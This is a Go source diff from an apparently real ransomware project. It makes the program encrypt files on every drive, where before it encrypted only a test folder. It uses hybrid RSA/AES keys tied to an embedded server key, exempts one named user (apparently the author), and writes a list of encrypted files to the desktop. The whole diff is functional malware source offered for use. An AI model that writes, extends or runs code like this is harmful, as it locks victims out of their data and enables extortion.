@@ -6,37 +6,50 @@ import (
 	"crypto/x509"
 	"io/fs"
 	"os"
+	"os/user"
 	"path/filepath"
 	"ransomware/encryption"
 	"ransomware/encryption/rsaLib"
 	"ransomware/io"
 	"ransomware/utils"
 	"sync"
+	"time"
 )
 
 var (
-	encryptedList []string
+	encryptedList []utils.FileInfo
 	waitGroup     sync.WaitGroup
 	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
 )
 
 func main() {
 
-	cPubKey, err := generateClientKeys(sPubKey)
+	var currentUser *user.User
+	startTime := time.Now()
+
+	clientPubKeys, err := generateClientKeys(sPubKey)
 	if err != nil {
 		panic(err)
 	}
 
-	currentDirectory, _ := os.Getwd()
-	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
-	encryptFiles(dir, cPubKey)
+	// currentDirectory, _ := os.Getwd()
+	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")
+	// encryptFiles(dir, clientPubKeys)
 
-	// drives := io.GetDrives()
-	// for _, drive := range drives {
-	// 	encryptFiles(drive, cPubKey)
-	// }
+	if currentUser, err = user.Current(); err != nil {
+		panic(err)
+	}
 
-	defer generateDesktopFiles()
+	if currentUser.Name == "Alex Paulo Couto" {
+		return
+	}
+
+	drives := utils.GetDrives()
+	for _, drive := range drives {
+		encryptFiles(drive, clientPubKeys)
+	}
+
+	defer utils.GenerateDesktopFiles(encryptedList, startTime)
 }
 
 func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
@@ -103,26 +116,12 @@ func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 		for file := range filesToVisit {
 			err = io.EncryptFile(&file, encryption.RSAAESEncrypt, cPubKey)
 			if err == nil {
-				encryptedList = append(encryptedList, file.Path)
+				encryptedList = append(encryptedList, utils.FileInfo{
+					Path: file.Path, Size: int(file.Info.Size())})
 			}
 		}
 		defer waitGroup.Done()
 	}()
 
 	waitGroup.Wait()
-}
-
-func generateDesktopFiles() {
-
-	var text string = "------ENCRYPTED FILES------\n\n"
-	desktopPath, err := utils.GetDesktopPath()
-	if err != nil {
-		panic(err)
-	}
-
-	for _, filePath := range encryptedList {
-		text = text + filePath + "\n"
-	}
-	bytes := []byte(text)
-	os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
 }
